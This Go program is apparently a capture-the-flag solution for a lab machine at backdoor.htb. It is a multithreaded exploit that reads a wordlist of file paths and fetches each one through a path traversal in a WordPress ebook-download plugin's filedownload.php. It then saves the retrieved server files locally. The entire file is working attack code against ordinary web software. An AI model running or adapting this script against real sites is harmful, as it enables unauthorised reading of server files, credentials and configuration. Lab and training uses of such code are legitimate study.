package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: ./backdoor <wordlist>")
        os.Exit(1)
    }

    // Open the wordlist
    wordlist, _ := os.Open(os.Args[1])
    defer wordlist.Close()

    // Set guard for multithreading
    threads := 10
    guard := make(chan struct{}, threads)
    wg := sync.WaitGroup{}

    // Read file line by line
    scanner := bufio.NewScanner(wordlist)
    for scanner.Scan() {
        filename := scanner.Text()  // Read a line from the file
        wg.Add(1)                   // Add a thread to the WaitGroup
        guard <- struct{}{}         // Add a thread to the guard
        
        // Run a goroutine to wget(filename)
        go func(filename string) {
            defer wg.Done()     // Done with the thread
            fmt.Printf("%s\n", filename)

            text := wget(filename)  // Exploit path traversal to read file

            // Write the text to a file
            output := "./output/" + strings.Replace(filename, "/", "_", -1)[1:]
            fp, _ := os.Create(output)
            defer fp.Close()
            io.WriteString(fp, text)

            <- guard            // Done with the thread
        }(filename)
    }
    wg.Wait()
    fmt.Println()
}

func wget(filename string) string {
    // Construct path traversal URL
    dots := "../../../../../.."
    url := "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=" + dots + filename

    // Make the get request
    response, _ := http.Get(url)
    body, _ := ioutil.ReadAll(response.Body)
    text := string(body)

    // Format the string
    text = strings.TrimSuffix(text, "<script>window.close()</script>")
    trim := (len(dots) + len(filename))*3
    text = text[trim:]

    return text
}
